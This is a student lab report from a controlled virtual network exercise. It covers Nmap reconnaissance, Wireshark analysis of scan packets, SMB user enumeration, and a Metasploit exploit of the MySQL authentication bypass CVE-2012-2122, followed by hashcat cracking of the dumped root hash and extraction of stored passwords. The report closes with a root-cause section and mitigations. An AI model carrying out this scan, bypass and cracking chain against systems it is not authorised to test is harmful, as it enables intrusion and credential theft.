I.  **INTRODUCTION**

This lab involves using Nmap for network reconnaissance and working with
vulnerable services inside a controlled virtual environment. The purpose
is to locate live hosts on the network, list their open ports and active
services, obtain operating system details, and finally use a vulnerable
MySQL service to retrieve sensitive information from the database.

The lab is set up with two virtual machines connected through a
VirtualBox NAT network on the 10.0.9.0/24 subnet. The student virtual
machine is the attacking machine, and its IP address is 10.0.9.5. The
server virtual machine is the target machine, with the IP address
10.0.9.4 and the hostname INCS-745-LAB-SERVER. All operations are
performed from the student virtual machine, which simulates a real-world
penetration testing scenario.

The tools used in this lab are Nmap, Wireshark, the Metasploit
Framework, and hashcat. Nmap is used for network scanning and
reconnaissance, Wireshark is used to capture and analyze network traffic,
the Metasploit Framework is used to carry out exploitation, and hashcat
is used for password hash cracking.

II. **TASKS for Reconnaissance using Nmap**

**1. Task 1**

For this task, I first checked that the lab setup was ready to use. I
used the ifconfig command to view the IP address of the Student VM, and
then used nmap \--version to make sure Nmap was installed.

**Command:** ifconfig

The output from ifconfig lists several network interfaces, including
Docker bridge interfaces. The interface needed for this lab is enp0s3.
It is assigned the IP address 10.0.9.5 in the 10.0.9.0/24 subnet, and
its VirtualBox MAC address is 08:00:27:e5:98:90.

{width="6.4in"
height="2.6496391076115486in"}

*Figure 1: ifconfig output listing the network interfaces*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 2: ifconfig output showing enp0s3 with IP address 10.0.9.5*

**Command:** nmap \--version

The command confirms that Nmap version 7.95 is installed on the Student
VM and is running on the x86_64-unknown-linux-gnu platform.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 3: Output confirming Nmap version 7.95*

1.  **Task 2**

I performed host discovery to find the active systems on the
10.0.9.0/24 network and determine which one was the target Server VM.

**Command:** sudo nmap -sn 10.0.9.0/24

The -sn option runs a Ping Scan, meaning Nmap only checks host
availability and does not scan ports. The /24 CIDR notation covers all
256 addresses in the subnet. This scan found 5 active hosts in 2.09
seconds:

10.0.9.1 - Gateway (QEMU virtual NIC, shown as \_gateway)

10.0.9.2 - VirtualBox DHCP server (QEMU virtual NIC)

10.0.9.3 - Unknown VM (Oracle VirtualBox NIC, MAC 08:00:27:F9:9C:F4)

10.0.9.4 - Target Server VM (Oracle VirtualBox NIC, MAC
08:00:27:D1:B0:6B)

10.0.9.5 - Student VM / local machine (hostname INCS-745-Lab-Student)

{width="6.4in"
height="3.1418186789151354in"}{width="1.3459328521434821in"
height="0.11610017497812773in"}

*Figure 4: Host discovery result showing 5 active hosts*

To verify which VirtualBox machine was the target server, I ran a quick
port scan against both 10.0.9.3 and 10.0.9.4. The scan showed that all
ports on 10.0.9.3 were filtered. In contrast, 10.0.9.4 had several open
services, including ssh, http, netbios-ssn, microsoft-ds, and mysql.
This confirmed that 10.0.9.4 was the target.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 5: Quick scan comparison of 10.0.9.3 with filtered ports and
10.0.9.4 with open ports*

2.  **Task 3**

Once 10.0.9.4 had been identified as the target, I started with a basic
Nmap scan. This scan was used to get an initial view of the services that
were exposed on commonly scanned ports.

**Command:** sudo nmap 10.0.9.4

With no extra port options, Nmap checks its default set of the top 1000
ports. The result showed 8 open TCP ports on the target: 21 (ftp), 22
(ssh), 53 (domain), 80 (http), 139 (netbios-ssn), 445 (microsoft-ds),
3306 (mysql), and 8080 (http-proxy). The other 992 ports in the default
set were closed. The scan took 0.45 seconds.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 6: Initial Nmap scan showing 8 open ports on 10.0.9.4*

Note: This first scan did not cover every possible port. Because it only
checked the top 1000 ports, services listening on 1139, 1445, and 3307
were not included in the result. A scan of the full port range is needed
to avoid missing those non-standard services.

**Task 3.1: Comprehensive Port Scanning**

**SYN Stealth Scan (Full Port Range)**

**Command:** sudo nmap -sS -p- -v 10.0.9.4

For the full-range scan, I used the SYN scan mode with -sS. In this
mode, Nmap sends a SYN packet and does not finish the full TCP
three-way handshake, which makes the scan faster and less obvious than a
normal connect scan. The -p- argument expands the scan to all 65,535 TCP
ports, while -v prints more detailed progress information as ports are
found.

This full scan finished in 32.25 seconds. It found 11 open TCP ports:
21 (ftp), 22 (ssh), 53 (domain), 80 (http), 139 (netbios-ssn), 445
(microsoft-ds), 1139 (cce3x), 1445 (proxima-lm), 3306 (mysql), 3307
(opsession-prxy), and 8080 (http-proxy). During the scan, Nmap sent
65,536 raw packets, totaling 2.884MB, and received 65,536 packets,
totaling 2.621MB.

The full scan revealed three ports that were absent from the default
scan: 1139, 1445, and 3307. Ports 1139 and 1445 may indicate additional
SMB-related services, and port 3307 appears to be another MySQL
instance. This difference shows that relying only on the default scan can
miss useful reconnaissance information.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 7: Full SYN scan while new open ports are being reported*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 8: Full SYN scan output listing 11 open ports*

**TCP Connect Scan (Ports 1-20)**

**Command:** sudo nmap -sT -p 1-20 -v 10.0.9.4

I also tested a TCP connect scan with -sT against ports 1-20. Unlike the
SYN scan, this method completes the connection process with SYN,
SYN-ACK, and ACK packets for each checked port. It is dependable, but it
takes longer and is more likely to appear in IDS logs. The scan reported
that all 20 ports in this range were closed, which matches the earlier
results because the visible services are on higher port numbers. The
runtime was 0.16 seconds.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 9: TCP Connect scan output for ports 1-10*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 10: TCP Connect scan output for ports 11-20, all closed*

**Wireshark Packet Capture Analysis**

To review the packet-level behavior, I opened the capture in Wireshark
and applied the filter \"port == 80 && ip.addr == 10.0.9.4\". This made
it easier to focus on traffic between the Student VM and the target
during the scan.

SYN Scan pattern: \[SYN\] -> \[SYN, ACK\] -> \[RST\] - For the SYN scan,
the Student VM sends a SYN packet to the target. When the target replies
with SYN-ACK, the port is shown as open. Instead of completing the
handshake, the scanner sends RST right away. This incomplete connection
is why the method is known as a \"half-open\" or \"stealth\" scan.

TCP Connect Scan pattern: \[SYN\] -> \[SYN, ACK\] -> \[ACK\] -> \[RST\]
- In the TCP connect scan, the scanner sends the ACK packet and fully
establishes the TCP connection before resetting it. Since a complete
connection is made, firewalls and IDS systems can detect this scan more
easily.

The capture also contained HTTP traffic from 91.189.91.98. That traffic
was not part of the scan; it appears to be Ubuntu update traffic from the
target server. For the selected RST packet, Wireshark shows 54 bytes on
wire. The packet was sent from 10.0.9.5 to 10.0.9.4, using TCP source
port 43263 and destination port 80.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 11: Wireshark view of the SYN, SYN-ACK, and RST packet sequence*

**Task 3.2: Focused Scanning (OS and Service Detection)**

**Command:** sudo nmap -p 1-200 -O -sV -v -oN xiaoxiao_nmap_33.txt
10.0.9.4

The next scan narrowed the port range to 1-200 and added options for
more detailed identification. The -O option attempts OS detection, -sV
checks service versions, and -v provides verbose output. The -oN option
saves the normal scan output into the file xiaoxiao_nmap_33.txt.

The service version output showed the following results:

Port 21/tcp - vsftpd 3.0.5 (FTP server)

Port 22/tcp - OpenSSH 8.9p1 Ubuntu (SSH server)

Port 53/tcp - ISC BIND 9.18.39-0ubuntu0.22.04.2 (DNS server)

Port 80/tcp - Apache httpd 2.4.52 (Ubuntu) (Web server)

Port 139/tcp - Samba smbd 3.X - 4.X (workgroup: WORKGROUP) (SMB/NetBIOS)

For OS detection, Nmap identified the target as Linux kernel 4.15 - 5.19
and categorized it as a general purpose device/router. The reported
uptime was about 23.6 days, beginning on January 25, 2026. The Service
Info section also confirmed the hostname INCS-745-LAB-SERVER and showed
the system type as Unix/Linux.

This focused scan completed in 13.25 seconds, with 223 raw packets sent
(10.606KB) and 215 packets received (9.298KB). The version information
is useful for exploitation planning because the exact software versions
can be compared with entries in CVE databases.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 12: OS and service detection scan command with progress output*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 13: Results from the OS and service version scan*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 14: Saved output file xiaoxiao_nmap_33.txt with the full scan
results*

3.  **Task 5**

**Command:** sudo nmap -p 139 \--script=smb-enum-users.nse 10.0.9.4

The Nmap Scripting Engine (NSE) extends Nmap\'s capabilities with
specialized scripts. The smb-enum-users.nse script enumerates user
accounts on the SMB service through port 139 (NetBIOS).

The script successfully discovered one user account:

Username: INCS-745-LAB-SERVER\\smb-user (RID: 1000)

Account Type: Normal user account

A significant finding was that the user account\'s Full Name field
contained a hidden flag:
\[SMB-FLAG\]ZwP6yQ6o8VNR3k7sajd1AnHAg8x2A4uX5fCWaNVSKCGtnk0/TL+dgtliPZctF69HeR/EyjDxJGriNW+WnhABo6m2CZ7vpGHHZO55TmxpfPnE5Wtg1SjDny3GFjkS6Xi7FCAEnuA057kBaMAIztL89RBtzu6JqSCxNhUMH2KmUfw=\[FLAG
ENDS\]

This demonstrates how NSE scripts can reveal sensitive information
hidden in user profile attributes. In a real penetration test, such data
could contain credentials, internal notes, or other valuable
intelligence that system administrators may not realize is exposed.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 15: NSE smb-enum-users script results showing SMB user with
hidden flag*

III. **Exploitation: MySQL Authentication Bypass (CVE-2012-2122)**

**Target Selection**

Based on the reconnaissance findings, I chose to exploit the MySQL
database vulnerability. The full port scan revealed two MySQL instances
running on ports 3306 and 3307. According to the lab instructions, only
one MySQL service is vulnerable, and a \"silly mistake\" allows MySQL to
sometimes accept incorrect passwords.

This description matches CVE-2012-2122, a known authentication bypass
vulnerability in MySQL/MariaDB versions 5.1.x through 5.5.x. Due to
improper casting of the memcmp() return value, approximately 1 in every
256 login attempts with an incorrect password will be incorrectly
accepted as valid.

**Step 1: Launch Metasploit Framework**

**Command:** msfconsole

Metasploit Framework v6.4.22-dev was launched with 2441 exploits, 1256
auxiliary modules, 429 post-exploitation modules, 1468 payloads, 47
encoders, 11 nops, and 9 evasion modules available.

{width="5.929413823272091in"
height="2.910803805774278in"}

*Figure 16: Launching Metasploit Framework*

{width="5.964003718285214in"
height="2.9277843394575678in"}

*Figure 17: Metasploit Framework ready (msf6 prompt)*

**Step 2: Select and Configure the Exploit Module**

**Commands:** use auxiliary/scanner/mysql/mysql_authbypass_hashdump

show options

The mysql_authbypass_hashdump module is designed to exploit
CVE-2012-2122. The module options show: RHOSTS (target host, required),
RPORT (target port, default 3306), THREADS (concurrent threads, default
1), and USERNAME (authentication username, default root).

{width="6.4in"
height="3.1418186789151354in"}

*Figure 18: Module options for mysql_authbypass_hashdump*

**Step 3: Test Port 3306 (Not Vulnerable)**

> **set RHOSTS 10.0.9.4**
>
> **set RPORT 3306**
>
> **run**

The module attempted to connect to MySQL on port 3306 but received the
error: \"Unable to login from this host due to policy (may still be
vulnerable)\". The MySQL instance on port 3306 rejected connections
based on host-based access policy, making it not exploitable from our
position.

{width="6.4in"
height="3.1418186789151354in"}

*Figure 19: Port 3306 - connection rejected by policy*

**Step 4: Exploit Port 3307 (Vulnerable Instance)**

> **set RPORT 3307**
>
> **run**

The module successfully exploited the MySQL instance on port 3307:

*\"The server allows logins, proceeding with bypass test\"*

*\"Successfully bypassed authentication after 130 attempts\"*

*\"Successfully exploited the authentication bypass flaw, dumping
hashes\...\"*

The module obtained the root user\'s password hash:

> **root:\*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9**

The hash was saved to:
/home/student/.msf4/loot/20260217204919_default_10.0.9.4_mysql.hashes_505628.txt

{width="6.4in"
height="3.1418186789151354in"}

*Figure 20: Successfully bypassed MySQL authentication and dumped
password hashes*

**Step 5: Crack the Password Hash with hashcat**

The obtained hash is in MySQL SHA1 format (indicated by the \* prefix).
Hashcat mode 300 is used for MySQL 4.1+ SHA1 hashes. The rockyou.txt
wordlist was located at /home/student/Desktop/Garbage/rockyou.txt using
the find command.

> **find / -name \"rockyou\*\" 2\>/dev/null**

{width="6.4in"
height="3.1418186789151354in"}

*Figure 21: Locating rockyou.txt wordlist*

The hash was saved to a file (removing the \* prefix required by hashcat
mode 300) and cracked:

> **echo \'6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9\' \> hash.txt**
>
> **hashcat -m 300 hash.txt /home/student/Desktop/Garbage/rockyou.txt
> \--force**
>
> **hashcat -m 300 hash.txt \--show**

{width="6.4in"
height="3.1418186789151354in"}

*Figure 22: hashcat successfully cracked the hash*

{width="6.4in"
height="3.1418186789151354in"}

*Figure 23: hashcat \--show reveals password: 123456*

**Cracked Password: 123456**

The root password \"123456\" is one of the most commonly used passwords
worldwide, further demonstrating the poor security practices on this
server.

**Step 6: Login to MySQL and Extract Data**

> **mysql -h 10.0.9.4 -P 3307 -u root -p**

After entering the cracked password \"123456\", I successfully logged
into the MySQL server (version 5.5.23 Source distribution). The
following SQL commands were used to enumerate and extract data:

> **SHOW DATABASES;**

Four databases were found: information_schema, mysql,
performance_schema, and test.

> **USE test;**
>
> **SHOW TABLES;**

The test database contains one table: users.

> **SELECT \* FROM users;**

{width="6.114358048993876in"
height="3.0015944881889762in"}

*Figure 24: Successfully logged into MySQL with cracked password*

{width="6.168353018372703in"
height="3.0281003937007873in"}

*Figure 25: SHOW DATABASES and USE test*

{width="6.15361220472441in"
height="3.020863954505687in"}

*Figure 26: SELECT \* FROM users - admin password discovered*

Data retrieved from the test.users table:

user1 - password: 123456

user2 - password: qwerty

admin - password: nyit2025

**Goal Achieved:** The admin user\'s password is \"nyit2025\".

**Why the Attack Worked**

The attack succeeded due to a combination of vulnerabilities and
misconfigurations:

1\. CVE-2012-2122 Authentication Bypass: The MySQL server on port 3307
was running MySQL version 5.5.23, which contains a critical
authentication bypass vulnerability. The memcmp() function used for
password comparison returns a value that is cast to a single byte,
causing approximately 1 in 256 authentication attempts to succeed
regardless of the password provided. Our attack succeeded after 130
attempts.

2\. Weak Root Password: The MySQL root account was protected with the
password \"123456\", which is trivially crackable using any standard
wordlist such as rockyou.txt.

3\. Remote Root Access Enabled: The MySQL server was configured to allow
remote root login, which should be disabled in production environments.

4\. Sensitive Data Stored in Plaintext: User credentials in the
test.users table were stored as plaintext rather than being properly
hashed, allowing immediate access to all user passwords once database
access was obtained.

5\. Non-Standard Port Provided False Security: Running MySQL on port
3307 instead of the default 3306 is a form of \"security through
obscurity\" which provides no real protection against a comprehensive
port scan.

**Security Mitigations**

The following security measures would prevent or mitigate this type of
attack:

1\. Patch Management: Update MySQL to a version not affected by
CVE-2012-2122. The vulnerability was fixed in MySQL 5.1.63, 5.5.25, and
5.6.7.

2\. Strong Password Policy: Enforce complex passwords for all database
accounts. The root password \"123456\" would be rejected by any
reasonable password policy.

3\. Restrict Remote Access: Disable remote root login by configuring the
MySQL user table to only allow root connections from localhost. Use
\"bind-address = 127.0.0.1\" in MySQL configuration.

4\. Hash Stored Passwords: Never store user passwords in plaintext. Use
strong hashing algorithms (bcrypt, Argon2) with unique salts for each
password.

5\. Network Segmentation and Firewall Rules: Implement firewall rules to
restrict database access to only authorized application servers. Do not
expose database ports to the entire network.

6\. Deploy IDS/IPS: Intrusion Detection/Prevention Systems can detect
and block repeated authentication attempts characteristic of the
CVE-2012-2122 exploit (130 rapid login attempts).

7\. Database Activity Monitoring: Implement logging and monitoring of
all database queries, especially those accessing sensitive tables, to
detect unauthorized data exfiltration.

IV. **CONCLUSION**

This lab demonstrated the complete penetration testing workflow from
reconnaissance to exploitation. Through systematic use of Nmap scanning
techniques, I identified 11 open services on the target server,
including multiple SMB, MySQL, and web services running on both standard
and non-standard ports. The Wireshark packet capture analysis revealed
the differences between SYN stealth scans and TCP connect scans at the
packet level. The NSE scripting engine proved valuable in enumerating
SMB users and discovering a hidden flag embedded in a user profile
attribute.

The exploitation phase focused on the MySQL authentication bypass
vulnerability (CVE-2012-2122) on port 3307. Using Metasploit\'s
mysql_authbypass_hashdump module, I successfully bypassed authentication
after 130 attempts, obtained the root password hash, and cracked it
using hashcat with the rockyou.txt wordlist. With root access to the
MySQL database, I retrieved the admin user\'s password (\"nyit2025\")
from the test database, completing the lab objective.

This exercise highlights the importance of defense-in-depth: no single
security measure is sufficient. Regular patching, strong passwords,
network segmentation, access controls, and monitoring must all work
together to protect against the type of multi-stage attack demonstrated
in this lab.

